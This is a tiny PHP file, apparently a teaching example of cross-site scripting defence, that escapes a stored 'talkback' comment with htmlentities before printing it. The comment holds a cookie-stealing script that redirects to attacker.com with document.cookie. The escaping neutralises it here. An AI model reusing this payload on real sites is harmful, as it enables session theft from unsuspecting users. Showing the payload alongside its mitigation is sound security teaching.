<?php
$comment= '
<script>
	location.href="http://attacker.com?cookies="+document.cookie;
</script>
';?>

<h1>talkbacks</h1>
<?=htmlentities($comment)?>